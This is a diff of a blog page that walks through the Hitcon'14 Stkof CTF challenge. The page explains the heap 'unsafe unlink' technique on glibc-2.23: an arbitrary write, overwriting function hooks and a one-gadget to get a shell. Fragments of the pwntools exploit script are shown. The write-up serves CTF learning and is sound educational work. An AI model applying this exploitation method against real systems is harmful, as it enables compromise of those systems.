@@ -47,10 +47,10 @@
         
         <section class="body">
           <h2 id="introduction">Introduction</h2>
-<p>In this blog post I’ll explain to how to solve this CTF and also show how the unsafe unlink attacks works.</p>
+<p>We will go through the basics of the unsafe unlink technique and practice on the Hitcon'14 Stkof challenge. This CTF will use the version glibc-2.23.</p>
 <h2 id="the-unlink-process">The unlink process</h2>
-<p>The pointer table in this CTF is massive, so you can call malloc almost as many times as you want. I&rsquo;ll get into the details on how to locate the pointer table later.</p>
-<p>I’ll start by adding ten <code>0x80</code> sized chunks for now.</p>
+<p>The unsafe unlink is a heap exploitation technique that allows us to unlink a heap chunk and achieve an arbitrary write. An arbitrary write will then be used to modify function hooks which are used to call functions. In our post we will target the <code>malloc</code> call to trigger the shell then modify the address <code>strlen</code> to <code>puts</code> for an info leak.</p>
+<p>The pointer table in this CTF starts at 0x602140, all <code>malloc</code> calls are stored here. Our CTF by design does not restrict the amount of times we call <code>malloc</code>. Hence we can create hundreds of chunks. I decided to start with ten <code>0x80</code> sized chunks.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
 </span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
 </span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
@@ -270,6 +270,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Call malloc</span>
 </span></span><span style="display:flex;"><span>scan(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x8</span>, p64(oneShot))
 </span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Enjoy your shell!</span>
 </span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>interactive()
 </span></span></code></pre></div><h2 id="references">References</h2>
